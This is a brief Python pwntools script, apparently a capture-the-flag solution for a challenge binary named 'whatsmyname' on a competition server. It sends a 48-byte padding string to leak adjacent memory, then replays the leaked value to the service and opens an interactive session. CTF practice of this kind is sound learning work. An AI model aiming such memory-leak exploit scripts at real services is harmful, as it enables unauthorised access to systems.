# -*- coding: utf-8 -*-
#wah
from pwn import *
elf_file = FILENAME = 'whatsmyname'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = 'challs.actf.co'
POST = 31223
#libc = ELF("./libc.so.6")
'''
HOST = 'localhost'
POST = 7777
libc = ELF("./libc.so.6")
#libc = ELF("./libc6-amd64_2.27-3ubuntu1_i386/data/lib64/libc.so.6")
'''
if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  io = process(FILENAME)
  c = gdb.attach(io,gdbscript='''b main''')

c.sendline('a'*48)
print(c.recvuntil('a'*48))
ans = c.recvline().strip('\x21\x0a')
c.send(ans)
c.interactive()